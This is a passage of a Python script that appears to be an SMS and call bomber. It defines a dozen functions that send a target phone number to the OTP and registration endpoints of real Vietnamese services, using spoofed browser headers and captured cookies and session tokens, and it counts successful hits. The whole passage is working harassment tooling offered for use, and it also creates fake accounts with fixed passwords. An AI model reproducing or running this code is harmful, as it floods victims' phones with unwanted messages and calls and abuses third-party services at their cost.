    # 'cookie': '_gid=GA1.2.794950800.1691145824; _ga_SQM4TCSQGX=GS1.1.1691145825.1.1.1691145870.0.0.0; pay_session=eyJpdiI6IkRieTVpNm1rTVVjWElNNnNoRENVVVE9PSIsInZhbHVlIjoiVTdCSTdYQ0gyM2Z2UFlkbStCaWtldjNGdlpsSm5lRk9kNVpMbkQxTysydGNPSGhXSk9CT0xmNVhReUp4TXVkaTQ2XC9PYTZrRUZUSE1kXC9Jbm1WbTNuUT09IiwibWFjIjoiNjAxYTBhMjlhYWE0N2RiMTA3ZTg5MGZjOWNjZmVlOWM1MzNkMjhlZGI0NjNmMGYxYmVhNGI5MWM3MmZiZGU1MSJ9; _ga=GA1.2.626969575.1691145824; _gat=1; _fbp=fb.1.1691145877829.1126099989; _ga_8W5EGNGFDP=GS1.2.1691145878.1.0.1691145878.0.0.0',
  }
  data = {
    'phone_number': f'{sdt}',
  }
  response = requests.post('https://vi.appota.com/check-phone-register.html',data=data,headers=headers).text
def itaphoa(sdt):
  headers = {
    'Host': 'api.itaphoa.com',
    'region-code': 'HCM',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'origin': 'https://shop.mioapp.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://shop.mioapp.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  params = {
    'phone': f'{sdt}',
    'type': 'call',
}
  response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers).text
def ghn(sdt):
  headers = {
    'Host': 'online-gateway.ghn.vn',
    # 'content-length': '40',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://sso.ghn.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    
  }
  data = '{"phone":"sdt","type":"register"}'.replace("sdt",sdt)
  response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, data=data).json()
def best_inc(sdt):
  headers = {
    'Host': 'v9-cc.800best.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '53',
    'x-timezone-offset': '7',
    'x-auth-type': 'web-app',
    'x-nat': 'vi-VN',
    'x-lan': 'VI',
    'authorization': 'null',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': 'application/json',
    'lang-type': 'vi-VN',
    'Origin': 'https://best-inc.vn',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://best-inc.vn/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt",sdt)
  response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode',data=data,headers=headers).text
def sapo(sdt):
  headers = {
    'Host': 'www.sapo.vn',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept': '*/*',
    'origin': 'https://www.sapo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1060296146.1691285262; _gid=GA1.2.497444655.1691285263; _ga_YNVPPJ8MZP=GS1.1.1691285263.1.0.1691285263.60.0.0; _ga=GA1.1.1816034013.1691285263; _ga_8956TVT2M3=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_CDD1S5P7D4=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_GECRBQV6JK=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_Y9YZPDEGP0=GS1.1.1691285265.1.0.1691285265.60.0.0; start_time=08/06/2023 8:27:45; source=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; _ga_X10JR147Y7=GS1.1.1691285264.1.0.1691285265.59.0.0; _fbp=fb.1.1691285267174.309606627; _ga_EBZKH8C7MK=GS1.2.1691285267.1.0.1691285267.0.0.0; referral=https://www.google.com/; landing_page=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; pageview=1; _ga_8Z6MB85ZM2=GS1.1.1691285265.1.1.1691285333.60.0.0',
    }
  data = {
    'phonenumber': f'{sdt}',
  }
  response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()
def findo(sdt):
  headers = {
    'Host': 'api.findo.vn',
    # 'content-length': '39',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.findo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.findo.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"mobilePhone":{"number":"sdt"}}'.replace('sdt',sdt)
  response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, data=data).text
def beecow(sdt):
  headers = {
    'Host': 'api.beecow.com',
    # 'content-length': '138',
    'content-type': 'application/json; text/plain',
    'accept': 'application/json, text/plain, application/stream+json',
    'ati': '1467350218617',
    'platform': 'WEB',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'time-zone': 'Asia/Saigon',
    'origin': 'https://admin.gosell.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://admin.gosell.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"password":"12345ccok@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"sdt"}}'.replace('sdt',sdt)
  response = requests.post('https://api.beecow.com/api/register/gosell', headers=headers, data=data).text
def cashberry(sdt):
  letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
  random1 = random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters)
  for x in random1:
    a = x+"@gmail.com" 
  headers = {
    'Host': 'cashberry.vn',
    # 'content-length': '1170',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://cashberry.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://cashberry.vn/dang-ky',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'cashberry_new_nuxt_front=vn; site_id=1f21f685be4e9ac1d9dde54d64a5ee30; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=wLU0zLsWJMCSuaFRsEAMR9lS8ymsmsZlauYDdKY58gA=; _ga=GA1.1.453475758.1691890639; _fbp=fb.1.1691890639098.1672690554; _lr_hb_-bdwvky%2Fcashberry-vn={%22heartbeat%22:1691890639757}; _lr_uf_-bdwvky=6e4dc5a7-23fc-4687-9efe-b0d1ea7ebdf2; _lr_tabs_-bdwvky%2Fcashberry-vn={%22sessionID%22:0%2C%22recordingID%22:%225-5d2ee190-bf44-4420-bbcf-69d94bc1229c%22%2C%22webViewID%22:null%2C%22lastActivity%22:1691890645656}; _ga_53M1222GXQ=GS1.1.1691890638.1.1.1691890649.0.0.0',
}
  data = '{"phone":"sdt","inn":"583805682558","email":"email11","password":"12345Gdtg@","password_repeat":"12345Gdtg@","agree":true,"is_confirmed_kyivstar":1,"email_mailing":1,"registrationActionsReport":{"Object_1":{"Keypress":null,"Activate":1,"TimeLast":3,"TimeAll":60,"SymbolFact":10,"Copy":null,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":17},"Object_2":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":19,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":4},"Object_3":{"Activate":1,"TimeLast":6,"TimeAll":6,"SymbolFact":10,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":null},"Object_15":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":null,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":null},"Object_41":{"Activate":null,"Changes":null,"Error":null}}}'.replace('email11',a)
  data = data.replace('sdt',sdt)
  response = requests.post('https://cashberry.vn/proxy/user/register', headers=headers, data=data).text

def kimungvay(sdt):
  headers = {
    'Host': 'api.kimungvay.co',
    # 'content-length': '73',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.kimungvay.site',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.kimungvay.site/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}

  data = {
    'phone': f'{sdt}',
    'type': '2',
    'ctype': '1',
    'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
}
  response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data).text
def call(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gcl_au': '1.1.1220684632.1686908084',
        'mousestats_vi': 'b9bd217114711a9d1e4d',
        '_tt_enable_cookie': '1',
        '_ttp': 'DA7mc7Uixiy6xP7mj1rjKm50ltN',
        '_ym_uid': '1686908086798167851',
        '_ym_d': '1686908086',
        'supportOnlineTalkID': 'TwQhuH4Ivv3H9eD0EtQAXMx5Myuu3vyx',
        'jslbrc': 'w.20230616093528211c112e-0c29-11ee-a59e-ee07a4cd7f9b.A_GS',
        '__cfruid': '29d5a9d7c2b2952e6ede5a8a00b88b99cad87e3e-1687066316',
        '_gcl_aw': 'GCL.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE',
        '_gid': 'GA1.2.995351727.1687066329',
        '_gac_UA-49883034-25': '1.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE',
        'mousestats_si': 'd57e5d5c25fbd471e1a0',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        'XSRF-TOKEN': 'eyJpdiI6ImVnWUpoLzZxTGRITElHK0N6R3BYVXc9PSIsInZhbHVlIjoiWnBOZzMwOHl4aE15R3BKNEcwSk1Cbkg5eitEYm5NL2RzckI2cHBIMVdUa2ZpK09yOUp3VXVIWjBwQVEvOEM5blRIaWZKSzZnNjk3RW93aEhRT1E0T3JNV0N1NGxLcFZhazFDTjQyZjRqekxEWDJUOUJkMEtjTVdLaXltVGg1YkQiLCJtYWMiOiIwNGI5Y2IyYTE2OWM2NmU5Njc4YTJlNjgwNzRhZDljY2JiMjcxZTVhYmRjOTYxMzM1ZmI4MDA4MTQyOTJkZDAzIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6ImRhTWVBZXVET0wxTWRTdnIzQVhvWWc9PSIsInZhbHVlIjoiejZFenByV2pYcHREZFFpVlBIY1krWDloVEtLZmZsblRBcGVwK2IzMkVxblVwWTM0V3dEcDFVb0txUFVFckQ5bXMyZ2pzTGNDQStYNlhkNHVkVTRWOE1pa0xxQnZrSW9nZzhqMXZOaGtIMjJLdzNkRUllR2cwZXh3OVRlRTFUOWQiLCJtYWMiOiJmN2NkZjQ5YjU2MzFiNjQ4NjZiN2U4ZGFiZWJmNjNjZjA2Mjk5ZTA2NTAxMTUzZTU4MTNiNDA5ZTdkYTkwMDg0IiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IkFDcHM0UHh1NzhZZTZ5MnphMzR1OWc9PSIsInZhbHVlIjoiTHBoTDdFRjgwOFRWeWdoSkZ4ZWVmT1NhZnk5YjdreWJhZmFpVFcrUFhPc0ROaUtsNEgrSW1DWVM1YTZ3b2RYVjdOZHk1bU1ObFl3WHFGOGdOdjkyZVdkWjZOWnlOTXZESHZ3emJrYml2YkhLNXFCN2RFQWVuQm1HMG5CWlF4aTciLCJtYWMiOiI5M2NkNzY3Mzg2Mzk2MTk3ZTQ3ZjVlMzMzNTZiMTFkMzU3MDIwYjJmNTg1MzhlOWEyOGM1YTBiYTZiZWFiNDlkIiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        '_ga_EBK41LH7H5': 'GS1.1.1687066331.4.1.1687066336.0.0.0',
        '_ga': 'GA1.1.1463404161.1686908084',
        'ec_etag_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'ec_etag_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'ec_etag_client': 'false',
        'ec_png_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'ec_png_client': 'false',
        'ec_png_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        '_clck': '1v0x9dl|2|fck|0|1262',
        'uid': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'client': 'false',
        'client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        '_clsk': 'pu0t|1687066342104|1|1|t.clarity.ms/collect',
        'amp_6e403e': '206vjTKXep_KxfYKYDBKzV.Ym9kb2lxdWExODlAZ21haWwuY29t..1h36fsjk0.1h36fsjk7.0.3.3',
    }
    headers = {
        'authority': 'robocash.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.1220684632.1686908084; mousestats_vi=b9bd217114711a9d1e4d; _tt_enable_cookie=1; _ttp=DA7mc7Uixiy6xP7mj1rjKm50ltN; _ym_uid=1686908086798167851; _ym_d=1686908086; supportOnlineTalkID=TwQhuH4Ivv3H9eD0EtQAXMx5Myuu3vyx; jslbrc=w.20230616093528211c112e-0c29-11ee-a59e-ee07a4cd7f9b.A_GS; __cfruid=29d5a9d7c2b2952e6ede5a8a00b88b99cad87e3e-1687066316; _gcl_aw=GCL.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE; _gid=GA1.2.995351727.1687066329; _gac_UA-49883034-25=1.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE; mousestats_si=d57e5d5c25fbd471e1a0; _ym_isad=1; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6ImVnWUpoLzZxTGRITElHK0N6R3BYVXc9PSIsInZhbHVlIjoiWnBOZzMwOHl4aE15R3BKNEcwSk1Cbkg5eitEYm5NL2RzckI2cHBIMVdUa2ZpK09yOUp3VXVIWjBwQVEvOEM5blRIaWZKSzZnNjk3RW93aEhRT1E0T3JNV0N1NGxLcFZhazFDTjQyZjRqekxEWDJUOUJkMEtjTVdLaXltVGg1YkQiLCJtYWMiOiIwNGI5Y2IyYTE2OWM2NmU5Njc4YTJlNjgwNzRhZDljY2JiMjcxZTVhYmRjOTYxMzM1ZmI4MDA4MTQyOTJkZDAzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImRhTWVBZXVET0wxTWRTdnIzQVhvWWc9PSIsInZhbHVlIjoiejZFenByV2pYcHREZFFpVlBIY1krWDloVEtLZmZsblRBcGVwK2IzMkVxblVwWTM0V3dEcDFVb0txUFVFckQ5bXMyZ2pzTGNDQStYNlhkNHVkVTRWOE1pa0xxQnZrSW9nZzhqMXZOaGtIMjJLdzNkRUllR2cwZXh3OVRlRTFUOWQiLCJtYWMiOiJmN2NkZjQ5YjU2MzFiNjQ4NjZiN2U4ZGFiZWJmNjNjZjA2Mjk5ZTA2NTAxMTUzZTU4MTNiNDA5ZTdkYTkwMDg0IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkFDcHM0UHh1NzhZZTZ5MnphMzR1OWc9PSIsInZhbHVlIjoiTHBoTDdFRjgwOFRWeWdoSkZ4ZWVmT1NhZnk5YjdreWJhZmFpVFcrUFhPc0ROaUtsNEgrSW1DWVM1YTZ3b2RYVjdOZHk1bU1ObFl3WHFGOGdOdjkyZVdkWjZOWnlOTXZESHZ3emJrYml2YkhLNXFCN2RFQWVuQm1HMG5CWlF4aTciLCJtYWMiOiI5M2NkNzY3Mzg2Mzk2MTk3ZTQ3ZjVlMzMzNTZiMTFkMzU3MDIwYjJmNTg1MzhlOWEyOGM1YTBiYTZiZWFiNDlkIiwidGFnIjoiIn0%3D; ec_cache_utm=6e7c3667-7f57-aeb3-742a-179ed2570f1e; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; _ga_EBK41LH7H5=GS1.1.1687066331.4.1.1687066336.0.0.0; _ga=GA1.1.1463404161.1686908084; ec_etag_utm=6e7c3667-7f57-aeb3-742a-179ed2570f1e; ec_etag_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; ec_etag_client=false; ec_png_utm=6e7c3667-7f57-aeb3-742a-179ed2570f1e; ec_png_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; _clck=1v0x9dl|2|fck|0|1262; uid=6e7c3667-7f57-aeb3-742a-179ed2570f1e; client=false; client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; _clsk=pu0t|1687066342104|1|1|t.clarity.ms/collect; amp_6e403e=206vjTKXep_KxfYKYDBKzV.Ym9kb2lxdWExODlAZ21haWwuY29t..1h36fsjk0.1h36fsjk7.0.3.3',
        'dnt': '1',
        'origin': 'https://robocash.vn',
        'referer': 'https://robocash.vn/register',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '_token': 'CutanxfZckD1Qdr73OLBR5qbqSSkssd6aF5W7fm3',
    }

    response = requests.post('https://robocash.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
    if 'success' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def thantai(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gid': 'GA1.2.1132206279.1687875869',
        '_gat_UA-230801217-1': '1',
        '_ym_uid': '1687875869663056834',
        '_ym_d': '1687875869',
        '_ga': 'GA1.1.957748551.1687875869',
        '_ga_LBS7YCVKY6': 'GS1.1.1687875709.2.1.1687875868.59.0.0',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        '_fw_crm_v': 'c9ea5955-655a-4727-cb03-6f34e924b252',
    }

    headers = {
        'authority': 'api.thantaioi.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1132206279.1687875869; _gat_UA-230801217-1=1; _ym_uid=1687875869663056834; _ym_d=1687875869; _ga=GA1.1.957748551.1687875869; _ga_LBS7YCVKY6=GS1.1.1687875709.2.1.1687875868.59.0.0; _ym_isad=1; _ym_visorc=w; _fw_crm_v=c9ea5955-655a-4727-cb03-6f34e924b252',
        'dnt': '1',
        'origin': 'https://thantaioi.vn',
        'referer': 'https://thantaioi.vn/user/login',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.thantaioi.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if 'call' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def denthan(phone):
    global thanhcong
    global thatbai
    cookies = {
        'cf_clearance': 'nBQLd21xs4s9qNO76yaYgKxJi88Vc4nNYUqplz7oj6s-1687050094-0-150',
        '_ym_uid': '1687050109497707699',
        '_ym_d': '1687050109',
        '_fw_crm_v': 'ad354c18-677c-4cb8-c41e-3dd93f254e07',
        '_gid': 'GA1.2.1662127750.1687876522',
        '_gat_UA-249712591-1': '1',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        '_ga': 'GA1.1.761500486.1687050108',
        '_ga_Y3HGD2EM2X': 'GS1.1.1687876522.2.1.1687876544.38.0.0',
    }

    headers = {
        'authority': 'api.caydenthan.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': 'cf_clearance=nBQLd21xs4s9qNO76yaYgKxJi88Vc4nNYUqplz7oj6s-1687050094-0-150; _ym_uid=1687050109497707699; _ym_d=1687050109; _fw_crm_v=ad354c18-677c-4cb8-c41e-3dd93f254e07; _gid=GA1.2.1662127750.1687876522; _gat_UA-249712591-1=1; _ym_isad=1; _ym_visorc=w; _ga=GA1.1.761500486.1687050108; _ga_Y3HGD2EM2X=GS1.1.1687876522.2.1.1687876544.38.0.0',
        'dnt': '1',
        'origin': 'https://caydenthan.vn',
        'referer': 'https://caydenthan.vn/user/login',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.caydenthan.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if 'call' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def vay(phone):
    global thanhcong
    global thatbai
    thatbai+=1
#call 1
def call1(phone):
    global thanhcong
    global thatbai
    cookies = {'_gid': 'GA1.2.1132206279.1687875869','_gat_UA-230801217-1': '1','_ym_uid': '1687875869663056834','_ym_d': '1687875869','_ga': 'GA1.1.957748551.1687875869','_ga_LBS7YCVKY6': 'GS1.1.1687875709.2.1.1687875868.59.0.0','_ym_isad': '1','_ym_visorc': 'w','_fw_crm_v': 'c9ea5955-655a-4727-cb03-6f34e924b252',}
